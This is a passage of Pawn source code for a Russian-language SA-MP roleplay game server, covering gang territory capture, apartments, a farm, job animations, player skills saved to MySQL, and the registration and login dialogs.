	UpdateBizz(businessid);

	switch(BizzInfo[businessid][bControl])
	{
	   	case TEAM_OPG1: MafiaTotalBizz[0] ++, MafiaTotalBizz[1] --;
	   	case TEAM_RSM: MafiaTotalBizz[1] ++, MafiaTotalBizz[0] --;
	}

	foreach(new playerid: Player)
	{
		if(!IsAMafia(playerid))
			continue;

		GangZoneHideForPlayer(playerid, CaptureZone);

		for(new i; i < sizeof capture_td; i ++) TextDrawHideForPlayer(playerid, capture_td[i]);
	}

	g_capture = g_capture_default_values;

	return 1;
}

stock UpdateCaptureTd()
{
	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%d", g_capture[C_TEAM_ATTACK_KILLS]);
	TextDrawSetString(capture_td[12], STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%d", g_capture[C_TEAM_PROTECT_KILLS]);
	TextDrawSetString(capture_td[13], STRING_GLOBAL);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "время:_%d:%02d", g_capture[C_TIME] / 60, g_capture[C_TIME] % 60);
	TextDrawSetString(capture_td[7], STRING_GLOBAL);

	return 1;
}

stock ShowPlayerOrdersList(playerid, stage = 0)
{
	new rows;

	mysql_query(dbHandle, "SELECT * FROM orders");

	rows = cache_num_rows();

	if(!rows)
		return SendClientMessage(playerid, C_RED, "В данный момент заказов нет");

	new fmt_str[130];

	STRING_GLOBAL[0] = EOS;

	new count;

	for(new idx = stage+1; idx < rows; idx ++)
	{
		if(count > 9) break;

		//if(cache_get_field_content_int(idx, "business") == 0)
		//	continue;

		format(fmt_str, sizeof fmt_str, "{FFFFFF}Бизнес: %d\tСтатус: %s\t{FFFFFF}Кол-во: %d шт.\tОплата: 50000р\n", cache_get_field_content_int(idx, "business"), cache_get_field_content_int(idx, "status") == 0 ? ("{FFCC00}[Ожидается]") : ("{FF3300}[В пути]"), cache_get_field_content_int(idx, "count"));
		strcat(STRING_GLOBAL, fmt_str);

		g_player_listitem[playerid][count] = cache_get_field_content_int(idx, "id");
		g_player_listitem_use[playerid] = idx;
		count ++;
	}

	if(count > 9)
	{
		strcat(STRING_GLOBAL, "Следующая страница >>");
	}

	ShowPlayerDialog
	(
		playerid, DIALOG_ORDERS, DIALOG_STYLE_LIST,
		"{FFCC00}Заказы продуктов бизнесами",
		STRING_GLOBAL,
		"Взять", "Отмена"
	);

	return 1;
}

forward LoadEntrances();
public LoadEntrances()
{
	new time = GetTickCount();

	new rows, fields;
	cache_get_data(rows, fields);

	if(rows)
	{
		for(new idx; idx < rows; idx ++)
		{
			SetEntranceData(idx, E_SQL_ID, cache_get_row_int(idx, 0, dbHandle));
			SetEntranceData(idx, POS_X, cache_get_row_float(idx, 1, dbHandle));
			SetEntranceData(idx, POS_Y, cache_get_row_float(idx, 2, dbHandle));
			SetEntranceData(idx, POS_Z, cache_get_row_float(idx, 3, dbHandle));
			SetEntranceData(idx, EXIT_POS_X, cache_get_row_float(idx, 4, dbHandle));
			SetEntranceData(idx, EXIT_POS_Y, cache_get_row_float(idx, 5, dbHandle));
			SetEntranceData(idx, EXIT_POS_Z, cache_get_row_float(idx, 6, dbHandle));
			SetEntranceData(idx, EXIT_ANGLE, cache_get_row_float(idx, 7, dbHandle));
			SetEntranceData(idx, E_PRICE_ROOM, cache_get_row_int(idx, 8, dbHandle));

			SetEntranceData(idx, E_PICKUP, CreateDynamicPickup(1318, 23, GetEntranceData(idx, POS_X), GetEntranceData(idx, POS_Y), GetEntranceData(idx, POS_Z), -1, -1));
			SetEntranceData(idx, E_AREA_ENTER, CreateDynamicSphere(GetEntranceData(idx, POS_X), GetEntranceData(idx, POS_Y), GetEntranceData(idx, POS_Z), 1.0));

			SetEntranceData(idx, E_MAP_ICON, CreateDynamicMapIcon(GetEntranceData(idx, POS_X), GetEntranceData(idx, POS_Y), GetEntranceData(idx, POS_Z), 31, 0, 0, 0, -1, STREAMER_MAP_ICON_SD, MAPICON_LOCAL));

			TOTALENTRANCE ++;
		}
	}

	for(new i; i < sizeof coord_rooms; i ++)
	{
		g_area_rooms[i] = CreateDynamicSphere(coord_rooms[i][0], coord_rooms[i][1], coord_rooms[i][2], 1.0);

		CreatePickup(19197, 23, coord_rooms[i][0], coord_rooms[i][1], coord_rooms[i][2], -1);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "- Квартира №%d -", i + 1);
		CreateDynamic3DTextLabel(STRING_GLOBAL, 0x3399FFFF, coord_rooms[i][0], coord_rooms[i][1], coord_rooms[i][2] + 1.0, 5.0);
	}

	printf("[Загружено подъездов]: <%d>. Потрачено: <%i ms>.", rows, GetTickCount() - time);
	return 1;
}

stock UpdateEntrance(idx)
{
	new icon = 32;

	for(new i; i < MAX_ROOMS; i ++)
	{
		if(strcmp(g_rooms[idx][i][ER_OWNER], "None"))
			continue;

		icon = 37;

		break;
	}

	if(IsValidDynamicMapIcon(g_entrance[idx][E_MAP_ICON]))
	{
		DestroyDynamicMapIcon(g_entrance[idx][E_MAP_ICON]);
		SetEntranceData(idx, E_MAP_ICON, CreateDynamicMapIcon(GetEntranceData(idx, POS_X), GetEntranceData(idx, POS_Y), GetEntranceData(idx, POS_Z), icon, 0, 0, 0, -1, STREAMER_MAP_ICON_SD, MAPICON_LOCAL));

	}
	else SetEntranceData(idx, E_MAP_ICON, CreateDynamicMapIcon(GetEntranceData(idx, POS_X), GetEntranceData(idx, POS_Y), GetEntranceData(idx, POS_Z), icon, 0, 0, 0, -1, STREAMER_MAP_ICON_SD, MAPICON_LOCAL));

	return 1;
}

forward LoadRooms();
public LoadRooms()
{
	new time = GetTickCount();
	new rows, fields;
	cache_get_data(rows, fields);

	new room_id,
		entranceid,
		text_buffer = -1;

	if(rows)
	{
		for(new idx; idx < rows; idx ++)
		{
			entranceid = cache_get_row_int(idx, 1, dbHandle);

			if(entranceid != text_buffer)
			{
				room_id = 0;
				UpdateEntrance(entranceid);
			}

			if(room_id > MAX_ROOMS) continue;

			SetRoomData(entranceid, room_id, ER_SQL_ID, cache_get_row_int(idx, 0, dbHandle));
			SetRoomData(entranceid, room_id, ER_PAY, cache_get_row_int(idx, 3, dbHandle));
			cache_get_field_content(idx, "owner", g_rooms[entranceid][room_id][ER_OWNER], dbHandle, MAX_PLAYER_NAME);
			SetRoomData(entranceid, room_id, ER_LOCK, bool: cache_get_row_int(idx, 4, dbHandle));

			text_buffer = entranceid;
			room_id ++;

			TOTALROOMS ++;

			//printf("sql: %d roomid: %d entranceid: %d pay: %d owner: %s lock: %d", GetRoomData(entranceid, room_id, ER_SQL_ID), room_id, entranceid, GetRoomData(entranceid, room_id, ER_PAY), GetRoomData(entranceid, room_id, ER_OWNER), GetRoomData(entranceid, room_id, ER_LOCK));
		}
	}

	printf("[Загружено квартир]: <%d>. Потрачено: <%i ms>.", TOTALROOMS, GetTickCount() - time);

	return 1;
}

forward LoadFerm();
public LoadFerm()
{
	new time = GetTickCount();
	new rows, fields;
	cache_get_data(rows, fields);

	if(rows)
	{
		for(new idx; idx < rows; idx ++)
		{
			cache_get_field_content(idx, "owner", g_ferm_info[F_OWNER], dbHandle, MAX_PLAYER_NAME);
			cache_get_field_content(idx, "sub", g_ferm_info[F_SUB], dbHandle, MAX_PLAYER_NAME);

			SetFermData(F_COST, cache_get_row_int(idx, 2, dbHandle));
			SetFermData(F_BANK, cache_get_row_int(idx, 3, dbHandle));
			SetFermData(F_PAY, cache_get_row_int(idx, 4, dbHandle));
			SetFermData(F_LOCK, cache_get_row_int(idx, 5, dbHandle));
			SetFermData(F_AMBAR, cache_get_row_int(idx, 6, dbHandle));
			SetFermData(F_PAYSENO, cache_get_row_int(idx, 7, dbHandle));
			SetFermData(F_PAYCOMB, cache_get_row_int(idx, 8, dbHandle));
			SetFermData(F_PAYTRAK, cache_get_row_int(idx, 9, dbHandle));
			SetFermData(F_PAYTRUC, cache_get_row_int(idx, 10, dbHandle));
		}
	}

	printf("[Загружена ферма]: Потрачено: <%i ms>.", GetTickCount() - time);

	UpdateFermLabel();

	return 1;
}

stock UpdateFermLabel()
{
	new owner[MAX_PLAYER_NAME],
		sub[MAX_PLAYER_NAME];

	owner = "{FFCC00}Отсутствует",
	sub = "{FFCC00}Отсутствует";

	if(strcmp(g_ferm_info[F_OWNER], "None")) format(owner, sizeof owner, "{ff614a}%s", GetFermData(F_OWNER));
	if(strcmp(g_ferm_info[F_SUB], "None")) format(sub, sizeof sub, "{ff614a}%s", GetFermData(F_SUB));

	STRING_GLOBAL[0] = EOS;
	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"{FFCC00}Ферма\n"\
		"{FFFFFF}Владелец: {FFCC00}%s\n"\
		"{FFFFFF}Заместитель: {FFCC00}%s\n"\
		"{FFFFFF}Статус: %s\n"\
		"{FFFFFF}Стоимость: {FFCC00}%dР\n"\
		"{FFFFFF}Для покупки используйте /buyferm",
		owner,
		sub,
		GetFermData(F_LOCK) == 0 ? "{66cc00}Открыта" : "{ff614a}Закрыта",
		GetFermData(F_COST)
	);

	if(!IsValidDynamic3DTextLabel(g_ferm_info[F_LABEL]))
		SetFermData(F_LABEL, CreateDynamic3DTextLabel(STRING_GLOBAL, 0xFFFF00FF, -807.6794,-1228.3556,43.4072, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0));
	else
		UpdateDynamic3DTextLabelText(g_ferm_info[F_LABEL], 0xFFFF00FF, STRING_GLOBAL);

	new string[123];
	format
	(
		string, sizeof string,
		"{FFFFFF}Зерна на ферме:\n"\
		"{FFFFFF}%d/{FFCC00}200.000 кг",
		GetFermData(F_AMBAR)
	);

 	if(!IsValidDynamic3DTextLabel(g_ferm_info[F_SKLAD]))
		SetFermData(F_SKLAD, CreateDynamic3DTextLabel(string, 0xFFFF00FF, -794.8856,-1117.6289,45.3736, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0));
	else
		UpdateDynamic3DTextLabelText(g_ferm_info[F_SKLAD], 0xFFFF00FF, string);

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ferm SET ambar=%d", GetFermData(F_AMBAR));
	mysql_query(dbHandle, STRING_GLOBAL);

	return 1;
}


stock ShowPlayerEntraceMenu(playerid)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_ENTRACE_MENU, DIALOG_STYLE_LIST,
		"{FFCC00}Меню подъезда",
		"{FFCC00}1. {FFFFFF}Список жильцов\n"\
		"{FFCC00}2. {FFFFFF}Регистрация\n"\
		"{FFCC00}3. {FFFFFF}Меню жильца",
		"Далее", "Закрыть"
	);
	return 1;
}

stock ShowPlayerFreeRomm(playerid, entranceid)
{
	if(0 <= entranceid <= MAX_ENTRANCES-1)
	{
		STRING_GLOBAL = "Квартира\t\tСтоимость\t\tОплачено\t\tВладелец\n\n{FFFFFF}";

		new fmt_str[144],
			owner[MAX_PLAYER_NAME];

		for(new idx; idx < MAX_ROOMS; idx ++)
		{
			owner = "{f6e58d}Отсутствует";

			if(strcmp(g_rooms[entranceid][idx][ER_OWNER], "None")) format(owner, sizeof owner, "{ff614a}%s", GetRoomData(entranceid, idx, ER_OWNER));

			format(fmt_str, sizeof fmt_str, "{FFCC00}№%d\t\t\t{FFFFFF}%d\t\t%d из 30\t\t\t%s\n", idx + 1, GetEntranceData(entranceid, E_PRICE_ROOM),  GetRoomData(entranceid, idx, ER_PAY), owner);
			strcat(STRING_GLOBAL, fmt_str);
		}

		ShowPlayerDialog
		(
			playerid, 0, DIALOG_STYLE_MSGBOX,
			"{FFCC00}Список жильцов",
			STRING_GLOBAL,
			"Закрыть", ""
		);

	}
	return 1;
}

stock GetFreeEntranceRoom(entranceid)
{
	new free_room = -1;

	if(0 <= entranceid <= MAX_ENTRANCES-1)
	{
		for(new idx; idx < MAX_ROOMS; idx ++)
		{
			if(strcmp(g_rooms[entranceid][idx][ER_OWNER], "None"))
				continue;

			free_room = idx;

			break;
		}
	}

	return free_room;
}

stock SetPlayerPosInRoom(playerid, entranceid = -1, roomid = -1)
{
	if(entranceid == -1 || roomid== -1)
		return 1;

	FreezePlayer(playerid, 2000);
	SetPlayerPos(playerid, 261.4644, 86.2341, 923.2872);
	SetPlayerFacingAngle(playerid, 0.0);
	SetPlayerInterior(playerid, 3);
	SetPlayerVirtualWorld(playerid, ((entranceid + 1) * 400) + (roomid + 2000));

	PI[playerid][P_IN_ROOM] = roomid;
	PI[playerid][P_IN_ENTRANCE] = entranceid;

	return 1;
}

stock ShowPlayerRoomInfo(playerid, entranceid = -1, roomid = -1)
{
	if(entranceid == -1 || roomid== -1)
		return 1;

	new owner[MAX_PLAYER_NAME] = "Отсутствует";

	if(strcmp(g_rooms[entranceid][roomid][ER_OWNER], "None")) format(owner, sizeof owner, "%s", GetRoomData(entranceid, roomid, ER_OWNER));

	STRING_GLOBAL[0] = EOS;

	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"{FFFFFF}Квартира №{FFCC00}%d\n"\
		"{FFFFFF}Владелец: {FFCC00}%s\n"\
		"{FFFFFF}Оплата в сутки: %d рублей\n"\
		"{FFFFFF}Статус: %s\n\n"\
		"{FFFFFF}Вы хотите войти в эту квартиру?",
		(roomid % 22) + 1,
		owner,
		GetEntranceData(entranceid, E_PRICE_ROOM),
		GetRoomData(entranceid, roomid, ER_LOCK) == true ? "{66cc00}Открыта" : "{ff614a}Закрыта"
	);

	ShowPlayerDialog
	(
		playerid, DIALOG_ROOM_ENTER, DIALOG_STYLE_MSGBOX,
		"{FFCC00}Квартира",
		STRING_GLOBAL,
		"Войти", "Отмена"
	);

	g_player_listitem_use[playerid] = roomid;

	return 1;
}

stock ShowPlayerDialogPayRoom(playerid, entranceid = -1, roomid = -1)
{
	if(entranceid == -1 || roomid== -1)
		return 1;

	new fmt_dialog[170];

	format
	(
		fmt_dialog, sizeof fmt_dialog,
		"{ffffff}Квартира:\t\t\t\t\t№%d\n"\
		"Оплаченных дней:\t\t\t\t%d из 30\n"\
		"Ежедневная плата:\t\t\t\t%d руб\n"\
		"На сколько дней Вы хотите оплатить квартиру?",
		(roomid % 22) + 1,
		GetRoomData(entranceid, roomid, ER_PAY),
		GetEntranceData(entranceid, E_PRICE_ROOM)
	);

	return ShowPlayerDialog(playerid, DIALOG_PAY_ROOM, DIALOG_STYLE_INPUT, "{ffcc00}Оплата квартиры", fmt_dialog, "Оплатить", "Назад");
}

stock ShowPlayerCoinsList(playerid)
{
	new fmt_str[80];
	STRING_GLOBAL[0] = EOS;
	for(new i; i < sizeof g_coins_list; i ++)
	{
		format(fmt_str, sizeof fmt_str, "{FFCC00}%d{FFFFFF}. {FFCC00}%s {FFFFFF}- %d реальных рублей\n", i + 1, g_coins_list[i][CL_NAME], g_coins_list[i][CL_PRICE]);
		strcat(STRING_GLOBAL, fmt_str);
	}

	ShowPlayerDialog
	(
		playerid, DIALOG_COINS_LIST, DIALOG_STYLE_LIST,
		"{FFCC00}Донат машины",
		STRING_GLOBAL,
		"Приобрести", "Назад"
	);

	return 1;
}

stock SAMP_AC_REAL_SPEED(playerid)
{
	new
		SAMP_AC_VEHICLE = GetPlayerVehicleID(playerid),
		Float: SPEED_X,
		Float: SPEED_Y,
		Float: SPEED_Z;

	switch(SAMP_AC_VEHICLE)
	{
		case 0: GetPlayerVelocity(playerid, SPEED_X, SPEED_Y, SPEED_Z);
		default: GetVehicleVelocity(SAMP_AC_VEHICLE, SPEED_X, SPEED_Y, SPEED_Z);
	}

	return floatround(floatsqroot(floatpower(floatabs(SPEED_X), 2.0) + floatpower(floatabs(SPEED_Y), 2.0) + floatpower(floatabs(SPEED_Z), 2.0)) * 100.0);
}

stock PlayerBanCheat(playerid,reason[])
{
	SetTimerEx("BannedPlayer",100,0,"is", playerid, reason);
	return 1;
}

forward BannedPlayer(playerid, reason[]);
public BannedPlayer(playerid, reason[])
{
	BanEx(playerid,reason);
	return 1;
}

stock GetPlayerOnOneIp(test_ip[])
{
	new against_ip[32];
	new ip_count = 0;
	foreach(new x: Player)
	{
		if(!IsPlayerConnected(x)) continue;
		GetPlayerIp(x,against_ip,32);
		if(!strcmp(against_ip,test_ip)) ip_count++;
	}
	return ip_count;
}

/*const UNOCCUPIED_SYNC = 209;

IPacket:UNOCCUPIED_SYNC(playerid, BitStream:bs)
{
    new unoccupiedData[PR_UnoccupiedSync];

    BS_IgnoreBits(bs, 8);
    BS_ReadUnoccupiedSync(bs, unoccupiedData);

    if(!(-1.0 <= unoccupiedData[PR_roll][0] <= 1.0)
        || !(-1.0 <= unoccupiedData[PR_roll][1] <= 1.0)
        || !(-1.0 <= unoccupiedData[PR_roll][2] <= 1.0)
        || !(-1.0 <= unoccupiedData[PR_direction][0] <= 1.0)
        || !(-1.0 <= unoccupiedData[PR_direction][1] <= 1.0)
        || !(-1.0 <= unoccupiedData[PR_direction][2] <= 1.0)
        //|| !(-15000.0 <= unoccupiedData[PR_position][0] <= 15000.0)
        //|| !(-15000.0 <= unoccupiedData[PR_position][1] <= 15000.0)
        //|| !(-15000.0 <= unoccupiedData[PR_position][2] <= 15000.0)
    ) {
        return false;
    }

    return true;
}*/

forward LoadPlayerSkills(playerid);
public LoadPlayerSkills(playerid)
{
	new rows, fields, buffer[64];
    cache_get_data(rows, fields);
    if(rows)
	{
		cache_get_field_content(0, "drive", buffer, dbHandle, 64);

		sscanf
		(
			buffer, "p<,>dddd",
			g_player_skills[playerid][S_LICS][0],
			g_player_skills[playerid][S_LICS][1],
			g_player_skills[playerid][S_LICS][2],
			g_player_skills[playerid][S_LICS][3]
		);

		cache_get_field_content(0, "gun", buffer, dbHandle, 64);

		sscanf
		(
			buffer, "p<,>dddddddd",
			g_player_skills[playerid][S_GUN][0],
			g_player_skills[playerid][S_GUN][1],
			g_player_skills[playerid][S_GUN][2],
			g_player_skills[playerid][S_GUN][3],
			g_player_skills[playerid][S_GUN][4],
			g_player_skills[playerid][S_GUN][5],
			g_player_skills[playerid][S_GUN][6],
			g_player_skills[playerid][S_GUN][7]
		);

		SetPlayerSkillData(playerid, S_T_FLIGHTS, cache_get_field_content_int(0, "t_flights"));
		SetPlayerSkillData(playerid, S_T_COUNT, cache_get_field_content_int(0, "t_count"));
		SetPlayerSkillData(playerid, S_TAXI_CALLS, cache_get_field_content_int(0, "taxi_calls"));
		SetPlayerSkillData(playerid, S_M_FIX, cache_get_field_content_int(0, "m_fix"));
		SetPlayerSkillData(playerid, S_B_FLIGHTS, cache_get_field_content_int(0, "b_flights"));
		SetPlayerSkillData(playerid, S_FERM_LVL, cache_get_field_content_int(0, "ferm_lvl"));
		SetPlayerSkillData(playerid, S_FERM_COUNT, cache_get_field_content_int(0, "ferm_count"));
	}
	else
	{
		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "INSERT INTO accounts_skills (owner, drive, gun) VALUES ('%d', '%d, %d, %d, %d', '%d, %d, %d, %d, %d, %d, %d, %d')",
		PI[playerid][pID],
		PI[playerid][pLic][0],
		PI[playerid][pLic][1],
		PI[playerid][pLic][2],
		PI[playerid][pLic][3],
		PI[playerid][pGunSkill][0],
		PI[playerid][pGunSkill][1],
		PI[playerid][pGunSkill][2],
		PI[playerid][pGunSkill][3],
		PI[playerid][pGunSkill][4],
		PI[playerid][pGunSkill][5],
		PI[playerid][pGunSkill][6],
		PI[playerid][pGunSkill][7]
		);

		mysql_query(dbHandle, STRING_GLOBAL);

		for(new i = 4; i > 0; i --) g_player_skills[playerid][S_LICS][i] = PI[playerid][pLic][i];
		for(new i = 8; i > 0; i --) g_player_skills[playerid][S_GUN][i] = PI[playerid][pGunSkill][i];
	}
	return 1;
}

stock SavePlayerSkills(playerid)
{
	STRING_GLOBAL[0] = EOS;

	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"UPDATE accounts_skills SET drive='%d, %d, %d, %d', gun='%d, %d, %d, %d, %d, %d, %d, %d', t_flights=%d, t_count=%d, taxi_calls=%d, m_fix=%d, b_flights=%d WHERE owner=%d",
		g_player_skills[playerid][S_LICS][0],
		g_player_skills[playerid][S_LICS][1],
		g_player_skills[playerid][S_LICS][2],
		g_player_skills[playerid][S_LICS][3],
		g_player_skills[playerid][S_GUN][0],
		g_player_skills[playerid][S_GUN][1],
		g_player_skills[playerid][S_GUN][2],
		g_player_skills[playerid][S_GUN][3],
		g_player_skills[playerid][S_GUN][4],
		g_player_skills[playerid][S_GUN][5],
		g_player_skills[playerid][S_GUN][6],
		g_player_skills[playerid][S_GUN][7],
		g_player_skills[playerid][S_T_FLIGHTS],
		g_player_skills[playerid][S_T_COUNT],
		g_player_skills[playerid][S_TAXI_CALLS],
		g_player_skills[playerid][S_M_FIX],
		g_player_skills[playerid][S_B_FLIGHTS],
		PI[playerid][pID]
	);

	mysql_tquery(dbHandle, STRING_GLOBAL);
}

forward ExtractionPlayer(playerid);
public ExtractionPlayer(playerid)
{
	switch(PI[playerid][P_JOB])
	{
		case JOB_MINER:
		{
			ApplyAnimation(playerid,"PED","IDLE_chat",4.1,0,0,0,1,5150);

			if(IsPlayerAttachedObjectSlotUsed(playerid,1))
				RemovePlayerAttachedObject(playerid,1);

			TogglePlayerControllable(playerid, 0);
			SetPlayerAttachedObject(playerid,2, 905, 5, 0.020944, 0.039285, -0.035010, 0.000000, 0.000000, 0.000000, 0.301603, 0.125763, 0.233199);
			SetPlayerAttachedObject(playerid,3, 906, 6, -0.032336, 0.111448, 0.001745, 0.000000, 0.000000, 0.000000, 0.026124, 0.048238, 0.048593);

			SetTimerEx("ExtraditionPlayer", 5700, false, "i", playerid);
		}
		case JOB_FARMER:
		{
		    TogglePlayerControllable(playerid, 1);
			ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
			SetPlayerAttachedObject(playerid, 2, 2901, 5, 0.01, 0.1, 0.2, 100, 10, 85);
			SetPVarInt(playerid, "relate", 1);

			new idx = random(sizeof coord_checkpoint_farmer_unload);

			SetPlayerCheckpoint(playerid, coord_checkpoint_farmer_unload[idx][0], coord_checkpoint_farmer_unload[idx][1], coord_checkpoint_farmer_unload[idx][2], 2.0);
		}
		case JOB_GUN_COLLECTOR:
		{
			RemovePlayerAttachedObject(playerid,3);

			gGunWorkWH[0] -= 50; // нужно на сборку оружия
			gGunWorkWH[1] -= 50; // нужно на сборку оружия
			UpdateWH(); // обновляем информацию о сборке оружия

			ApplyAnimation(playerid,"PED","IDLE_tired",4.1,0,1,1,1,1000*5);
			ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
			SetPlayerAttachedObject(playerid,3,2969,1,0.075578,0.407083,0.000000,1.248928,97.393852,359.645050,1.000000,1.000000,1.000000);
			SetPVarInt(playerid, "relate",1);
			SendClientMessage(playerid, C_OSNOV, "Оружие собрано, отнесите его на склад");
			SetPlayerCheckpoint(playerid,570.9894,807.7607,12.2700-1,2.5);//склад сборщика оружия
		}
	}
	return 1;
}

forward ExtraditionPlayer(playerid);
public ExtraditionPlayer(playerid)
{
	if(IsPlayerAttachedObjectSlotUsed(playerid,2))
		RemovePlayerAttachedObject(playerid,2);

	if(IsPlayerAttachedObjectSlotUsed(playerid,3))
		RemovePlayerAttachedObject(playerid,3);

    TogglePlayerControllable(playerid, 1);
	SetPlayerAttachedObject(playerid,2, 1458, 1, -1.034844, 1.116571, -0.065124, 76.480148, 75.781570, 280.952545, 0.575599, 0.604554, 0.624122);
	SetPlayerAttachedObject(playerid,3, 905, 1, -0.275758, 1.305280, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000);
	SendClientMessage(playerid, C_OSNOV, "Вы успешно добыли руду, отнесите ее к вагону!");
	SetPlayerCheckpoint(playerid, 1611.7820,1444.3751,455.9069-1.0, 2.0);
	SetPVarInt(playerid, "FixBugs", 0);

	SetPVarInt(playerid, "relate", 1);

	return 1;
}
/*forward TBottles();
public TBottles()
{
	for(new i = 0; i<MAX_PLAYERS; i++)
	{
	    STRING_GLOBAL[0] = EOS;
		new randbottles = random(5) + 1;
		if(pocket[1][i] >= 15) return SendClientMessage(i, COLOR_GREY, "- Пакет заполнен. Сдайте бутылки.");
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "- Вы нашли: {BFBFBF}%d бутылок.", randbottles);
		SendClientMessage(i, COLOR_BLUE, STRING_GLOBAL);
		bottles[i] += randbottles;
		pocket[1][i] += randbottles;
		KillTimer(BTimer);
	}
	return 1;
}*/

forward GatDerevo(playerid);
public GatDerevo(playerid)
{
	TogglePlayerControllable(playerid, 1);
    KillTimer(DerevoTimer[playerid]);
	DisablePlayerCheckpoint(playerid);
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.1,0,1,1,1,1);
	if(IsPlayerAttachedObjectSlotUsed(playerid, 3)) RemovePlayerAttachedObject(playerid, 3);
	SetPlayerAttachedObject(playerid, 4, 1463, 1, 0.184699, 0.426247, 0.000000, 259.531341, 80.949592, 0.000000, 0.476124, 0.468181, 0.470769);
	SetPlayerCheckpoint(playerid,907.0281,473.4711,12.0054,2.0);
	SetPVarInt(playerid, "LessStatus", 1);
	GoDerevo[playerid] = 1;
    return 0;
}

stock ShowDialogAutorizationPlayer(playerid)
{
	STRING_GLOBAL[0] = EOS;
	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"{ffffff}С возвращением на {37c268}HOME ONLINE{ffffff}\n"\
		"Для продолжения игры, Вам необходимо ввести пароль\n\n"\
		"{37c268}Логин: %s{37c268}\n"\
		"Введите пароль:",
		GetName(playerid)
	);

 	ShowPlayerDialog
	(
		playerid, D_LOGIN, DIALOG_STYLE_PASSWORD,
		"{FFCC00}Авторизация",
		STRING_GLOBAL,
		"Войти", "Отмена"
	);

	return 1;
}
stock ShowDialogRegisterPlayer(playerid)
{
	ShowPlayerDialog
	(
		playerid, D_REGISTER, DIALOG_STYLE_INPUT,
		"{FFFFFF}Регистрация",
		!"{FFFFFF}Добро пожаловать на {37c268}HOME ONLINE\n"\
		"{FFFFFF}Для начала игры на сервере, Вам необходимо пройти регистрацию\n\n"\
		"Укажите пароль для вашего аккаунта\n"\
		"Он будет запрошен для входа в аккаунт при авторизации!\n\n"\
		"{37c268}Длина пароля должна быть от 6 до 16 символов\n"\
        "Используйте буквы латинского алфавита и цифры\n"\
		"Пароль чуствителен к регистру",
		"Далее", "Отмена"
	);
}

stock ShowDialogMailPlayer(playerid)
{
	ShowPlayerDialog
	(
		playerid, D_JOB+30, DIALOG_STYLE_INPUT,
		"{FFFFFF}Регистрация",
		"{FFFFFF}Укажите Ваш действующий {37c268}e-mail {ffffff}адрес\n"\
		"С помощью него Вы сможете восстановить аккаунт\n"\
		"в случае утери данных Или взлома.\n\n"\
		"Изменить {37c268}e-mail {ffffff}можно в настройках аккаунта",
		"Далее", "Отмена"
	);

	return 1;
}

stock ShowDialogReferalPlayer(playerid)
{
	ShowPlayerDialog
	(
		playerid, D_JOB+33, DIALOG_STYLE_INPUT,
		"{FFFFFF}Реферал",
		!"{ffffff}Введите имя игрока, пригласившего Вас на сервер\n\
		Если Вас никто не приглашал, то нажмите \"Пропустить\"\n\n\
		Если Вы достигните 5 уровня,\n\
		то{37c268} Ваш реферал получит 40 000 рублей.",
		"Ок", "Пропустить"
	);

	return 1;
}

stock ShowPlayerDialogGoogle(playerid)
{
	ShowPlayerDialog
	(
		playerid, DIALOG_GOOGLE_SET_REG, DIALOG_STYLE_MSGBOX,
		"{FFCC00}Google Authenticator",
		!"{FFFFFF}Данная функция необходима для увелечения безопасности Вашего аккаунта.\n"\
		"Активировав Google Authenticator Вы получите бонус в размере 50 000 рублей при достижении 4-го уровня.",
		"Активировать", "Пропустить"
	);
	return 1;
}

stock ShowDialogSexPlayer(playerid)
{
	ShowPlayerDialog
	(
		playerid, D_SEX, DIALOG_STYLE_MSGBOX,
		"{FFCC00}Выбор пола",
		"{FFFFFF}Пожалуйста, выберите свой пол:",
		"Мужской", "Женский"
	);
}

stock SavePlayerBottles(playerid)
{
	STRING_GLOBAL[0] = EOS;

	format
	(
		STRING_GLOBAL, sizeof STRING_GLOBAL,
		"UPDATE accounts SET bottles_count=%d, bottles='", PI[playerid][pBottles]
	);

	new fmt_str[25];

	for(new idx; idx < MAX_BOTTLES; idx ++)
	{
		format(fmt_str, sizeof fmt_str, "%d", g_bottles[playerid][idx]);
		strcat(STRING_GLOBAL, fmt_str);

		if(idx == MAX_BOTTLES-1) strcat(STRING_GLOBAL, "'");
		else strcat(STRING_GLOBAL, ",");
	}

	format(fmt_str, sizeof fmt_str, " WHERE id=%d", PI[playerid][pID]);
	strcat(STRING_GLOBAL, fmt_str);

	printf("%s", STRING_GLOBAL);

	mysql_query(dbHandle, STRING_GLOBAL);

	return 1;
}

/*stock ShowPlayerHousesDialog(playerid)
{
	STRING_GLOBAL[0] = EOS;
	new fmt_info[144];
	new last_index;
	new count = 1;
	new last_j;
	new j;

	for(new idx = count; idx < count + 99; idx ++)
	{
		//if(last_index > count+99)
		//	break;

		printf("1");

		for(j = 0; j < 4; j ++)
		{
			if(j > last_j) continue;

			printf("j=%d", j);

			printf("3");

			format(fmt_info, sizeof fmt_info, "%d-%s", idx+j, !strcmp(HouseInfo[idx+j][hOwner], "None", true) ? ("свобен") : ("занят"));
			strcat(STRING_GLOBAL, fmt_info);

			printf("4");

			if(j >= 4) strcat(STRING_GLOBAL, "\n"), last_j = j;
			else strcat(STRING_GLOBAL, "\t\t");

			printf("fmt: %s", fmt_info);

			printf("5");
			if((idx+j % 4) == 0) strcat(STRING_GLOBAL, "\n");
